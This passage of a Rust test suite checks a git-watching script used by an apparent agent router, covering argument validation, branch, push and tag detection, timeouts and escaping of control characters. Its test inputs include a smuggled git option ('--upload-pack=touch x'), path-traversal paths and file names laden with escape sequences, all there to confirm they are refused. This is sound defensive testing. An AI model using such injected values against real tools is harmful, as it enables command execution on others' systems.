        assert!(wired_guard(&c, "Bash", serde_json::json!({ "command": cmd })).is_some(), "router may run {cmd:?}");
    }
    // the grant is the worker's alone
    for cmd in ["cargo test", "keel preflight wu HEAD", "keel mr confirm wu HEAD --as owner"] {
        assert!(wired_guard(&c, "Bash", serde_json::json!({ "command": cmd })).is_some(), "router may run {cmd:?}");
    }

    // the router closes it: stopped then removed by id, and its argv carried the grant, the mode and the subscribed name
    let out = router(&format!("scripts/router-worker.sh stop {name}"));
    assert_eq!(out, format!("STOPPED name={name} id={id} session={sid}\n"));
    let cli: Vec<Vec<String>> = calls(&state).into_iter().map(|(_, a)| a).filter(|a| a[0] == "stop" || a[0] == "rm").collect();
    assert_eq!(cli, [vec!["stop".to_string(), id.clone()], vec!["rm".to_string(), id]]);
    let a = worker_argv(&state, name);
    assert_eq!(option(&a, "--permission-mode"), "plan");
    assert_eq!(option(&a, "--effort"), "high");
    assert_eq!(option(&a, "-n"), name);
    assert!(!c.join(".router/out").exists());
}

/// A checkout holding scripts/router-watch.sh, cloned from a bare `origin.git` file remote (no
/// network), plus the stepped `sleep` shim and a `date` shim that prints $STEP_DIR/now when it exists.
struct Watcher {
    _d: TempDir,
    base: PathBuf,
    main: PathBuf,
}

fn watcher() -> Watcher {
    let d = TempDir::new().unwrap();
    let base = d.path().canonicalize().unwrap();
    let (origin, main) = (base.join("origin.git"), base.join("main"));
    git(&base, &["init", "-q", "--bare", "-b", "main", origin.to_str().unwrap()]);
    git(&base, &["clone", "-q", origin.to_str().unwrap(), main.to_str().unwrap()]);
    std::fs::create_dir_all(main.join("scripts")).unwrap();
    std::fs::copy(root().join("scripts/router-watch.sh"), main.join("scripts/router-watch.sh")).unwrap();
    git(&main, &["add", "."]);
    git(&main, &["commit", "-qm", "base"]);
    git(&main, &["push", "-q", "origin", "main"]);
    sleep_shim(&base);
    std::fs::write(base.join("shim/date"), "#!/bin/sh\n[ -e \"$STEP_DIR/now\" ] && exec cat \"$STEP_DIR/now\"\nexec /bin/date \"$@\"\n").unwrap();
    std::fs::set_permissions(base.join("shim/date"), std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
    Watcher { _d: d, base, main }
}

impl Watcher {
    fn sha(&self, rev: &str) -> String {
        String::from_utf8(git(&self.main, &["rev-parse", rev]).stdout).unwrap().trim().to_string()
    }

    /// Write each file (content = msg) on the current branch and commit them; returns the new tip.
    fn commit(&self, files: &[&str], msg: &str) -> String {
        for f in files {
            std::fs::write(self.main.join(f), msg).unwrap();
            git(&self.main, &["add", f]);
        }
        git(&self.main, &["commit", "-qm", msg]);
        self.sha("HEAD")
    }

    /// `scripts/router-watch.sh <args>` as the router runs it, its polls stepped through steps-<k>/;
    /// an exported ROUTER_WATCH_POLL or ROUTER_WATCH_MAX never reaches it, only `env` sets them.
    fn cmd(&self, args: &[&str], k: &str, env: &[(&str, &str)]) -> (Command, PathBuf) {
        let dir = self.base.join(format!("steps-{k}"));
        std::fs::create_dir_all(&dir).unwrap();
        let mut c = common::cmd("scripts/router-watch.sh");
        hermetic(&mut c)
            .args(args)
            .current_dir(&self.main)
            .env("PATH", format!("{}:{}", self.base.join("shim").display(), std::env::var("PATH").unwrap()))
            .env("STEP_DIR", &dir)
            .env("STUB_OWNER", std::process::id().to_string())
            .env_remove("ROUTER_WATCH_POLL")
            .env_remove("ROUTER_WATCH_MAX")
            .envs(env.iter().copied());
        (c, dir)
    }

    fn armed(&self, args: &[&str], k: &str) -> Stepped {
        self.armed_env(args, k, &[])
    }

    fn armed_env(&self, args: &[&str], k: &str, env: &[(&str, &str)]) -> Stepped {
        let (mut c, dir) = self.cmd(args, k, env);
        Stepped { child: c.stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap(), dir }
    }

    /// A `git` on $PATH (with the `sleep` shim) ahead of the real one that logs each call to <base>/spy.log and, when
    /// $GIT_SPY_FAIL is 1, fails every fetch: returns that PATH and the log.
    fn spy(&self) -> (String, PathBuf) {
        let real = String::from_utf8(common::cmd("sh").args(["-c", "command -v git"]).output().unwrap().stdout).unwrap();
        let dir = self.base.join("spy");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("git"), format!(
            "#!/bin/sh\necho \"$*\" >> \"$GIT_SPY_LOG\"\ncase \"$GIT_SPY_FAIL $*\" in 1*\" fetch \"*) printf 'fatal: spy refuses fetch\\nspy: last\\377line\\n' >&2; exit 128;; esac\nexec {} \"$@\"\n",
            real.trim()
        )).unwrap();
        std::fs::set_permissions(dir.join("git"), std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
        (format!("{}:{}:{}", dir.display(), self.base.join("shim").display(), std::env::var("PATH").unwrap()), self.base.join("spy.log"))
    }

    /// One run to its end with polls 1..=go pre-released: (exit code, stdout, stderr, polls taken).
    /// A run still going after BOUND (it polled past `go`) is killed and fails the test.
    fn run(&self, args: &[&str], k: &str, go: u32, env: &[(&str, &str)]) -> (Option<i32>, String, String, u32) {
        let s = self.armed_env(args, k, env);
        for n in 1..=go {
            s.go(n);
        }
        let dir = s.dir.clone();
        let o = s.output();
        let polls = std::fs::read_to_string(dir.join("polls")).map_or(0, |s| s.trim().parse().unwrap());
        (o.status.code(), String::from_utf8(o.stdout).unwrap(), String::from_utf8(o.stderr).unwrap(), polls)
    }
}

/// E-SEED2.W12 review r3: git under a test ignores whatever global or system config the environment
/// points at, so a user's tag.gpgSign (or any other setting) cannot change a test's outcome.
#[test]
fn hermetic_git_ignores_global_and_system_config() {
    let d = TempDir::new().unwrap();
    let hostile = d.path().join("gitconfig");
    std::fs::write(&hostile, "[tag]\n\tgpgSign = true\n").unwrap();
    let mut c = common::cmd("git");
    c.args(["config", "--list", "--show-origin"]).current_dir(d.path()).env("GIT_CONFIG_GLOBAL", &hostile).env("GIT_CONFIG_SYSTEM", &hostile).env("GIT_TRACE", "1");
    let o = hermetic(&mut c).output().unwrap();
    let list = String::from_utf8(o.stdout).unwrap();
    assert!(o.status.success() && !list.contains("gpgsign"), "{list}");
    assert_eq!(String::from_utf8(o.stderr).unwrap(), "", "a GIT_TRACE* variable reached git");
    let mut c = common::cmd("git");
    c.args(["init", "-q", "r"]).current_dir(d.path()).env("GIT_DEFAULT_HASH", "sha256");
    assert!(hermetic(&mut c).status().unwrap().success());
    let f = hermetic(&mut common::cmd("git")).args(["rev-parse", "--show-object-format"]).current_dir(d.path().join("r")).output().unwrap();
    assert_eq!(String::from_utf8(f.stdout).unwrap(), "sha1\n", "GIT_DEFAULT_HASH reached git init");
}

/// E-SEED2.W12: every argument router-watch.sh cannot validate is refused with exit 2 before its
/// first poll; no git option can ride in on a leading `-`.
#[test]
fn watch_refuses_bad_arguments_before_any_poll() {
    let w = watcher();
    let t = w.sha("HEAD");
    let tree = w.sha("HEAD^{tree}");
    for (args, why) in [
        (vec![], "kind"),
        (vec!["watch", "main"], "kind"),
        (vec!["signed"], "signed <tip>"),
        (vec!["signed", &t, "x"], "signed <tip>"),
        (vec!["merged", &t], "merged <tip> <target>"),
        (vec!["merged", &t, "main", "x"], "merged <tip> <target>"),
        (vec!["pushed", &t, "main", "x"], "pushed <tip> <branch>"),
        (vec!["pushed", &t], "pushed <tip> <branch>"),
        (vec!["tagged"], "tagged <tag> [<sha>]"),
        (vec!["tagged", "v1", &t, "x"], "tagged <tag> [<sha>]"),
        (vec!["commit", "main"], "commit <branch> <old-tip>"),
        (vec!["pushed", &t, "--upload-pack=touch x"], "may not start with -"),
        (vec!["commit", "-b", &t], "may not start with -"),
        (vec!["commit", "main", &t, "-x"], "may not start with -"),
        (vec!["commit", "no/such", &t], "no branch"),
        (vec!["commit", "a..b", &t], "no branch"),
        (vec!["merged", &t, "nope"], "no branch"),
        (vec!["pushed", &t, "nope"], "no branch"),
        (vec!["tagged", "v1..2"], "bad tag"),
        (vec!["signed", "deadbeef"], "not a commit"),
        (vec!["signed", "HEAD"], "not a commit"),
        (vec!["signed", "abc"], "not a commit"),
        (vec!["signed", &tree], "not a commit"),
        (vec!["tagged", "v1", "deadbeef"], "not a commit"),
        (vec!["commit", "main", &t, "../x"], "bad path"),
        (vec!["commit", "main", &t, "a/../b"], "bad path"),
        (vec!["commit", "main", &t, "/etc/hosts"], "bad path"),
    ] {
        let (code, out, err, polls) = w.run(&args, "refuse", 0, &[]);
        assert!(
            code == Some(2) && out.is_empty() && err.starts_with("router-watch: ") && err.contains(why),
            "{args:?} not refused for {why}: {code:?} {out} {err}"
        );
        assert_eq!(polls, 0, "{args:?} polled before refusing");
    }
    let huge = "99999999999999999999";
    for (k, v) in [("ROUTER_WATCH_POLL", "x"), ("ROUTER_WATCH_POLL", "0"), ("ROUTER_WATCH_POLL", "1.5"), ("ROUTER_WATCH_POLL", "-1"), ("ROUTER_WATCH_POLL", huge), ("ROUTER_WATCH_MAX", "x"), ("ROUTER_WATCH_MAX", " 5"), ("ROUTER_WATCH_MAX", "1e3"), ("ROUTER_WATCH_MAX", huge)] {
        let (code, out, err, polls) = w.run(&["signed", &t], "knob", 0, &[(k, v)]);
        assert!(code == Some(2) && out.is_empty() && err.contains(k) && polls == 0, "{k}={v:?} not refused: {code:?} {out} {err}");
    }
}

/// E-SEED2.W12: `commit` fires when the branch moves and reports each commit with its Reviewed-By,
/// every landed path, and the staged paths that are missing or unexpected; a rewritten branch is
/// REWRITTEN.
#[test]
fn watch_commit_reports_what_landed_against_what_was_staged() {
    let w = watcher();
    let old = w.sha("HEAD");
    let mut s = w.armed(&["commit", "main", &old, "a", "b"], "partial");
    s.at(1);
    s.go(1);
    s.at(2);
    let a = w.commit(&["a"], "docs: a\n\nReviewed-By: username vuluu");
    s.go(2);
    assert_eq!(
        s.line(),
        format!("COMMITTED-PARTIAL branch=main from={old} to={a} commits=1 expected=1/2\n  commit {a} reviewed-by=username vuluu docs: a\n  landed A a\n  missing b\n")
    );

    // already true when armed: fires on the first check, before any poll
    let c = w.commit(&["c"], "c");
    let d = w.commit(&["d", "a"], "d");
    let (code, out, _, polls) = w.run(&["commit", "main", &old, "a", "c"], "already", 0, &[]);
    assert_eq!((code, polls), (Some(0), 0));
    assert_eq!(
        out,
        format!(
            "COMMITTED branch=main from={old} to={d} commits=3 expected=2/2\n  commit {a} reviewed-by=username vuluu docs: a\n  commit {c} reviewed-by=none c\n  commit {d} reviewed-by=none d\n  landed A a\n  landed A c\n  landed A d\n  unexpected d\n"
        )
    );
    let (_, out, _, _) = w.run(&["commit", "main", &c], "nopaths", 0, &[]);
    assert_eq!(out, format!("COMMITTED branch=main from={c} to={d} commits=1 expected=0/0\n  commit {d} reviewed-by=none d\n  landed M a\n  landed A d\n"));

    let mut s = w.armed(&["commit", "main", &d], "rewritten");
    s.at(1);
    git(&w.main, &["commit", "-q", "--amend", "-m", "d2"]);
    s.go(1);
    let d2 = w.sha("HEAD");
    assert_eq!(s.line(), format!("REWRITTEN branch=main from={d} to={d2}\n"));

    // a folded trailer is one value; control characters in commit text never reach the router raw
    let f = w.commit(&["f"], "f \x1b[2Jx\ry\n\nReviewed-By: username\n vuluu\x07");
    let (_, out, _, _) = w.run(&["commit", "main", &d2], "folded", 0, &[]);
    assert_eq!(out, format!("COMMITTED branch=main from={d2} to={f} commits=1 expected=0/0\n  commit {f} reviewed-by=username vuluu? f ?[2Jx?y\n  landed A f\n"));

    // a net-empty range with staged paths: every path missing, no stray line
    let e = w.commit(&["e"], "e");
    git(&w.main, &["rm", "-q", "e"]);
    git(&w.main, &["commit", "-qm", "drop e"]);
    let de = w.sha("HEAD");
    let (_, out, _, _) = w.run(&["commit", "main", &f, "e"], "empty", 0, &[]);
    assert_eq!(out, format!("COMMITTED-PARTIAL branch=main from={f} to={de} commits=2 expected=0/1\n  commit {e} reviewed-by=none e\n  commit {de} reviewed-by=none drop e\n  missing e\n"));

    // a branch deleted mid-watch is DELETED, not a rewrite
    git(&w.main, &["branch", "wu/gone"]);
    let g = w.sha("wu/gone");
    let mut s = w.armed(&["commit", "wu/gone", &g], "deleted");
    s.at(1);
    git(&w.main, &["branch", "-q", "-D", "wu/gone"]);
    s.go(1);
    assert_eq!(s.line(), format!("DELETED branch=wu/gone from={g}\n"));

    // review r4: a hostile file name never reaches the router raw, even under core.quotePath=false
    git(&w.main, &["config", "core.quotePath", "false"]);
    let h = w.sha("HEAD");
    let hh = w.commit(&["e\u{202e}v\u{2028}l\u{9b}"], "h");
    let (_, out, _, _) = w.run(&["commit", "main", &h, "x\x1b[2J"], "hostile-path", 0, &[]);
    assert_eq!(out, format!("COMMITTED-PARTIAL branch=main from={h} to={hh} commits=1 expected=0/1\n  commit {hh} reviewed-by=none h\n  landed A e?v?l?\n  missing x?[2J\n  unexpected e?v?l?\n"));
}

/// E-SEED2.W12: `signed` fires on the mr note and prints its payload; `merged` fires once the tip is in
/// the target and says how it got there.
#[test]
fn watch_signed_and_merged_report_the_note_and_how_the_tip_landed() {
    let w = watcher();
    let t = w.sha("HEAD");
    git(&w.main, &["notes", "--ref=test", "add", "-m", "test/v1", &t]);
    let mut s = w.armed(&["signed", &t], "signed");
    s.at(1);
    git(&w.main, &["notes", "--ref=mr", "add", "-m", "level: wu\nby: vu\rluu\x1b]0;x\x07\x7f\nu: \u{7e}\u{80}\u{9b}\u{9f}\u{a0}\u{e9}|\u{2027}\u{2028}\u{2029}\u{202e}\u{202f}|\u{2065}\u{2066}\u{2069}\u{206a}", &t]);
    s.go(1);
    assert_eq!(s.line(), format!("SIGNED tip={t}\n  level: wu\n  by: vu?luu?]0;x??\n  u: ~???\u{a0}\u{e9}|\u{2027}???\u{202f}|\u{2065}??\u{206a}\n"));

    // review r8: a note with an invalid UTF-8 byte, under the router's UTF-8 locale: one SIGNED, exit 0
    let u = w.commit(&["u"], "u");
    let note = w.base.join("bad-note");
    std::fs::write(&note, b"by: a\xffb\n").unwrap();
    git(&w.main, &["notes", "--ref=mr", "add", "-F", note.to_str().unwrap(), &u]);
    let o = w.armed_env(&["signed", &u], "bad-byte", &[("LC_ALL", "en_US.UTF-8")]).output();
    assert_eq!((o.status.code(), o.stdout), (Some(0), [format!("SIGNED tip={u}\n").as_bytes(), b"  by: a\xffb\n"].concat()));

    git(&w.main, &["switch", "-q", "-c", "wu/x"]);
    let x = w.commit(&["x"], "x");
    git(&w.main, &["switch", "-q", "main"]);
    let mut s = w.armed(&["merged", &x, "main"], "noff");
    s.at(1);
    git(&w.main, &["merge", "-q", "--no-ff", "-m", "merge x", "wu/x"]);
    s.go(1);
    assert_eq!(s.line(), format!("MERGED tip={x} target=main at={} how=no-ff\n", w.sha("main")));

    git(&w.main, &["switch", "-q", "-c", "wu/y"]);
    let y = w.commit(&["y"], "y");
    git(&w.main, &["switch", "-q", "main"]);
    git(&w.main, &["merge", "-q", "--ff-only", "wu/y"]);
    let (_, out, _, polls) = w.run(&["merged", &y[..7], "main"], "ff", 0, &[]);
    assert_eq!((out, polls), (format!("MERGED tip={y} target=main at={y} how=ff\n"), 0));

    git(&w.main, &["switch", "-q", "-c", "wu/z"]);
    let z = w.commit(&["z"], "z");
    git(&w.main, &["switch", "-q", "-c", "wu/z2"]);
    w.commit(&["z2"], "z2");
    git(&w.main, &["switch", "-q", "main"]);
    git(&w.main, &["merge", "-q", "--no-ff", "-m", "merge z2", "wu/z2"]);
    let (_, out, _, _) = w.run(&["merged", &z, "main"], "contained", 0, &[]);
    assert_eq!(out, format!("MERGED tip={z} target=main at={} how=contained\n", w.sha("main")));

    // review r3 (owner ruling V1-A): a target deleted mid-watch ends the watch at once, quietly
    git(&w.main, &["branch", "epic/gone"]);
    git(&w.main, &["switch", "-q", "-c", "wu/v"]);
    let v = w.commit(&["v"], "v");
    git(&w.main, &["switch", "-q", "main"]);
    let mut s = w.armed(&["merged", &v, "epic/gone"], "target-deleted");
    s.at(1);
    git(&w.main, &["branch", "-q", "-D", "epic/gone"]);
    s.go(1);
    let dir = s.dir.clone();
    let o = s.output();
    assert_eq!((o.status.code(), String::from_utf8(o.stdout).unwrap(), String::from_utf8(o.stderr).unwrap()), (Some(0), "DELETED target=epic/gone\n".into(), String::new()));
    assert_eq!(std::fs::read_to_string(dir.join("polls")).unwrap().trim(), "1");
}

/// E-SEED2.W12 review r1: a branch that exists only locally is "not pushed yet", never a network
/// failure; the watch keeps polling past 5 attempts and fires PUSHED after the first push.
#[test]
fn watch_pushed_waits_on_a_local_only_branch_without_reporting_unreachable() {
    let w = watcher();
    git(&w.main, &["switch", "-q", "-c", "wu/local"]);
    let t = w.commit(&["l"], "l");
    let mut s = w.armed(&["pushed", &t, "wu/local"], "local-only");
    s.at(1);
    for n in 1..=5 {
        s.go(n);
        s.at(n + 1);
    }
    git(&w.main, &["push", "-q", "origin", "wu/local"]);
    s.go(6);
    let dir = s.dir.clone();
    assert_eq!(s.line(), format!("PUSHED tip={t} branch=wu/local origin={t}\n"));
    assert_eq!(std::fs::read_to_string(dir.join("sleeps")).unwrap(), "60\n".repeat(6), "pushed polls every 60 s by default");
}

/// The test harness itself: a watch that polls more than the test released fails the test in
/// bounded time instead of hanging `cargo test`, and leaves no `sleep` shim behind.
#[test]
fn watcher_run_is_bounded_when_the_watch_outpolls_its_releases() {
    let w = watcher();
    let t = w.sha("HEAD");
    let msg = |e: Box<dyn std::any::Any + Send>| e.downcast_ref::<String>().cloned().or_else(|| e.downcast_ref::<&str>().map(|m| m.to_string())).unwrap();
    let e = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| w.run(&["signed", &t], "unreleased", 0, &[]))).unwrap_err();
    assert!(msg(e).contains("never returned"));
    let mut at = w.armed(&["signed", &t], "unreleased-at");
    let out = w.armed(&["signed", &t], "unreleased-output");
    std::thread::scope(|sc| {
        let a = sc.spawn(|| std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| at.at(2))).unwrap_err());
        let o = sc.spawn(|| std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| out.output())).unwrap_err());
        assert!(msg(a.join().unwrap()).contains("never reached poll 2"));
        assert!(msg(o.join().unwrap()).contains("never returned"));
    });
    drop(at);
    let shim = w.base.join("shim/sleep");
    let shim = shim.to_str().unwrap();
    until("the sleep shim to exit", || {
        let o = Command::new("ps").args(["-A", "-o", "command="]).output().unwrap();
        !String::from_utf8_lossy(&o.stdout).contains(shim)
    });
}

/// E-SEED2.W12: `pushed` fires only once origin holds the tip (not on the local merge); `tagged` fires
/// once origin lists the tag and flags a tag on another commit.
#[test]
fn watch_pushed_and_tagged_fire_on_origin_only() {
    let w = watcher();
    let base = w.sha("HEAD");
    git(&w.main, &["switch", "-q", "-c", "wu/p"]);
    let t = w.commit(&["p"], "p");
    git(&w.main, &["switch", "-q", "main"]);
    let mut s = w.armed(&["pushed", &t, "main"], "pushed");
    s.at(1);
    git(&w.main, &["merge", "-q", "--no-ff", "-m", "merge p", "wu/p"]);
    s.go(1);
    s.at(2);
    git(&w.main, &["push", "-q", "origin", "main"]);
    s.go(2);
    assert_eq!(s.line(), format!("PUSHED tip={t} branch=main origin={}\n", w.sha("main")));

    // the fetch writes refs/remotes/origin/<b> and nothing else: no auto-followed tag, no FETCH_HEAD
    let other = w.base.join("other");
    git(&w.base, &["clone", "-q", w.base.join("origin.git").to_str().unwrap(), other.to_str().unwrap()]);
    git(&other, &["commit", "-q", "--allow-empty", "-m", "o"]);
    git(&other, &["tag", "-a", "vo", "-m", "vo"]);
    git(&other, &["push", "-q", "origin", "main", "vo"]);
    let o = String::from_utf8(git(&other, &["rev-parse", "HEAD"]).stdout).unwrap().trim().to_string();
    let m = w.sha("main");
    let refs = || String::from_utf8(git(&w.main, &["for-each-ref", "--format=%(refname) %(objectname)"]).stdout).unwrap();
    git(&w.main, &["update-ref", "-d", "refs/remotes/origin/HEAD"]);
    git(&w.main, &["config", "remote.origin.followRemoteHEAD", "always"]);
    let before = refs();
    let (_, out, _, _) = w.run(&["pushed", &m, "main"], "only-ref", 0, &[]);
    assert_eq!(out, format!("PUSHED tip={m} branch=main origin={o}\n"));
    let after = refs();
    let changed: Vec<&str> = after.lines().filter(|l| !before.lines().any(|b| b == *l)).collect();
    assert_eq!(changed, [format!("refs/remotes/origin/main {o}")], "pushed wrote more than its ref:\n{after}");
    let gitdir = w.main.join(".git");
    assert!(!gitdir.join("FETCH_HEAD").exists(), "pushed wrote FETCH_HEAD");

    // origin/<b> already at origin's tip: no fetch
    let (path, log) = w.spy();
    let (_, out, _, _) = w.run(&["pushed", &m, "main"], "no-fetch", 0, &[("PATH", &path), ("GIT_SPY_LOG", log.to_str().unwrap())]);
    assert_eq!(out, format!("PUSHED tip={m} branch=main origin={o}\n"));
    let calls = std::fs::read_to_string(&log).unwrap();
    assert!(calls.contains("ls-remote") && !calls.contains("fetch"), "{calls}");

    let mut s = w.armed(&["tagged", "v1", &t], "tagged");
    s.at(1);
    git(&w.main, &["tag", "-a", "v1", "-m", "v1", &t]);
    s.go(1);
    s.at(2);
    git(&w.main, &["push", "-q", "origin", "v1"]);
    s.go(2);
    let dir = s.dir.clone();
    assert_eq!(s.line(), format!("TAGGED tag=v1 object={} commit={t}\n", w.sha("v1")));
    assert_eq!(std::fs::read_to_string(dir.join("sleeps")).unwrap(), "60\n60\n", "tagged polls every 60 s by default");

    git(&w.main, &["tag", "v2", &base]);
    git(&w.main, &["push", "-q", "origin", "v2"]);
    let (_, out, _, _) = w.run(&["tagged", "v2", &t], "mismatch", 0, &[]);
    assert_eq!(out, format!("TAGGED-MISMATCH tag=v2 object={base} commit={base} expected={t}\n"));
    let (_, out, _, _) = w.run(&["tagged", "v2"], "no-sha", 0, &[]);
    assert_eq!(out, format!("TAGGED tag=v2 object={base} commit={base}\n"), "with no sha any commit is TAGGED");
}

/// E-SEED2.W12: past its deadline the watch prints TIMEOUT; a network kind gives up after 5 failed
/// attempts in a row with UNREACHABLE and the last error in plain words.
#[test]
fn watch_times_out_and_reports_an_unreachable_origin() {
    let w = watcher();
    let t = w.sha("HEAD");
    let (code, out, _, polls) = w.run(&["signed", &t], "timeout", 0, &[("ROUTER_WATCH_MAX", "0")]);
    assert_eq!((code, out.as_str(), polls), (Some(0), "TIMEOUT kind=signed waited=0m\n", 0));

    git(&w.main, &["remote", "set-url", "origin", w.base.join("missing.git").to_str().unwrap()]);
    for (args, k) in [(vec!["pushed", t.as_str(), "main"], "pushed"), (vec!["tagged", "v1"], "tagged")] {
        let (code, out, _, polls) = w.run(&args, &format!("unreachable-{k}"), 4, &[]);
        let err = out.strip_prefix(&format!("UNREACHABLE kind={k} remote=origin error=")).unwrap_or_else(|| panic!("{out}"));
        assert!(code == Some(0) && out.lines().count() == 1 && err.trim().len() > 1, "{out}");
        assert!(err.trim_end().chars().all(|c| c.is_ascii_alphanumeric() || " ._/:=@%,+^~-".contains(c)), "{out}");
        assert_eq!(polls, 4, "{k}: 5 attempts, 4 polls between them");
    }

    // a success resets the count: 4 failures, 1 success, then 5 more failures before UNREACHABLE
    git(&w.main, &["commit", "-q", "--allow-empty", "-m", "local only"]);
    let local = w.sha("HEAD");
    let mut s = w.armed(&["pushed", &local, "main"], "reset");
    for n in 1..=3 {
        s.go(n);
    }
    s.at(4);
    git(&w.main, &["remote", "set-url", "origin", w.base.join("origin.git").to_str().unwrap()]);
    s.go(4);
    s.at(5);
    git(&w.main, &["remote", "set-url", "origin", w.base.join("missing.git").to_str().unwrap()]);
    for n in 5..=9 {
        s.go(n);
    }
    let dir = s.dir.clone();
    let out = s.line();
    assert!(out.starts_with("UNREACHABLE kind=pushed "), "{out}");
    assert_eq!(std::fs::read_to_string(dir.join("polls")).unwrap().trim(), "9", "the count did not reset on success");

    // review r3: a poll whose ls-remote works but whose fetch fails is a failed attempt; a poll that
    // finds the branch missing on origin is a good one and resets the count
    git(&w.main, &["remote", "set-url", "origin", w.base.join("origin.git").to_str().unwrap()]);
    git(&w.main, &["push", "-q", "origin", "main"]);
    let tip = w.sha("main");
    let other = w.base.join("other-f");
    git(&w.base, &["clone", "-q", w.base.join("origin.git").to_str().unwrap(), other.to_str().unwrap()]);
    git(&other, &["commit", "-q", "--allow-empty", "-m", "ahead"]);
    git(&other, &["push", "-q", "origin", "HEAD:refs/heads/wu/f"]);
    git(&w.main, &["fetch", "-q", "origin", "wu/f"]);
    git(&other, &["commit", "-q", "--allow-empty", "-m", "ahead2"]);
    git(&other, &["push", "-q", "origin", "HEAD:refs/heads/wu/f"]);
    let (path, log) = w.spy();
    let env = [("PATH", path.as_str()), ("GIT_SPY_LOG", log.to_str().unwrap()), ("GIT_SPY_FAIL", "1"), ("LC_ALL", "en_US.UTF-8")];
    let mut s = w.armed_env(&["pushed", &tip, "wu/f"], "fetch-fails", &env);
    for n in 1..=3 {
        s.go(n);
    }
    s.at(4);
    git(&other, &["push", "-q", "origin", "--delete", "wu/f"]);
    s.go(4);
    s.at(5);
    git(&other, &["push", "-q", "origin", "HEAD:refs/heads/wu/f"]);
    for n in 5..=9 {
        s.go(n);
    }
    let dir = s.dir.clone();
    let out = s.line();
    assert_eq!(out, "UNREACHABLE kind=pushed remote=origin error=spy: last line\n", "the error is git's whole last line, an invalid byte as a space");
    let calls = std::fs::read_to_string(&log).unwrap();
    let fetches: Vec<&str> = calls.lines().filter(|l| l.contains(" fetch ")).collect();
    assert!(!fetches.is_empty() && fetches.iter().all(|l| ["--no-tags", "--no-write-fetch-head", "--no-auto-maintenance", "--no-recurse-submodules"].iter().all(|f| l.contains(f))), "{fetches:?}");
    let network: Vec<&str> = calls.lines().filter(|l| l.contains(" fetch ") || l.contains(" ls-remote ")).collect();
    assert!(network.iter().any(|l| l.contains(" ls-remote ")), "{calls}");
    assert!(network.iter().all(|l| l.contains("-c http.lowSpeedLimit=1 -c http.lowSpeedTime=120 ")), "a network call without the http stall bound: {network:?}");
    assert_eq!(std::fs::read_to_string(dir.join("polls")).unwrap().trim(), "9", "a missing branch did not reset the count");

    // review r5: tagged resets its count on a good ls-remote too (the tag is not there yet)
    let (good, bad) = (w.base.join("origin.git"), w.base.join("missing.git"));
    git(&w.main, &["remote", "set-url", "origin", bad.to_str().unwrap()]);
    let mut s = w.armed(&["tagged", "v9"], "tagged-reset");
    for n in 1..=3 {
        s.go(n);
    }
    s.at(4);
    git(&w.main, &["remote", "set-url", "origin", good.to_str().unwrap()]);
    s.go(4);
    s.at(5);
    git(&w.main, &["remote", "set-url", "origin", bad.to_str().unwrap()]);
    for n in 5..=9 {
        s.go(n);
    }
    let dir = s.dir.clone();
    let out = s.line();
    assert!(out.starts_with("UNREACHABLE kind=tagged "), "{out}");
    assert_eq!(std::fs::read_to_string(dir.join("polls")).unwrap().trim(), "9", "tagged did not reset the count on success");
}

/// E-SEED2.W12 review r5: by default a watch polls every 15 s and gives up with TIMEOUT once 6600 s
/// (110 min) have passed, reported in whole minutes; the clock is the `date` shim.
#[test]
fn watch_polls_at_its_default_pace_and_times_out_in_minutes() {
    let w = watcher();
    let t = w.sha("HEAD");
    let dir = w.base.join("steps-pace");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("now"), "1000").unwrap();
    let mut s = w.armed(&["signed", &t], "pace");
    s.at(1);
    std::fs::write(dir.join("now"), "7599").unwrap();
    s.go(1);
    s.at(2);
    std::fs::write(dir.join("now"), "7600").unwrap();
    s.go(2);
    assert_eq!(s.line(), "TIMEOUT kind=signed waited=110m\n");
    assert_eq!(std::fs::read_to_string(dir.join("sleeps")).unwrap(), "15\n15\n");

    // the defaults hold whatever the test process exported: the knobs reach the watch only via `env`
    let (c, _) = w.cmd(&["signed", &t], "knobs", &[]);
    let removed: Vec<&std::ffi::OsStr> = c.get_envs().filter(|(_, v)| v.is_none()).map(|(k, _)| k).collect();
    assert!(["ROUTER_WATCH_POLL", "ROUTER_WATCH_MAX"].iter().all(|k| removed.contains(&std::ffi::OsStr::new(k))), "{removed:?}");
}
